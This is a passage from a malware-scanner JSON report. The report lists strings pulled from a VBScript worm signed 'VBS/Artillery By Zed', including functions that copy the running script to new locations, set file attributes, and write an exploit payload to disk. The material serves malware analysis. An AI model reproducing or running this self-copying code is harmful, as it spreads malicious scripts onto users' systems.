            "Else",
            "BreakFolder = TextStr",
            "End If",
            "End Function",
            "Function CreateExpCode(ExpPath)",
            "On Error Resume Next",
            "Set Write1Exp = fso.CreateTextFile(ExpPath, True)",
            "Write1Exp.Write ExploitCode",
            "Write1Exp.Close",
            "End Function",
            "Function FCopy(FPath, FAttributes)",
            "On Error Resume Next",
            "fso.CopyFile WScript.ScriptFullName, FPath",
            "If fso.FileExists(FPath) Then",
            "fso.GetFile(FPath).Attributes = FAttributes",
            "End If",
            "End Function",
            "'VBS/Artillery By Zed"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.346398",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
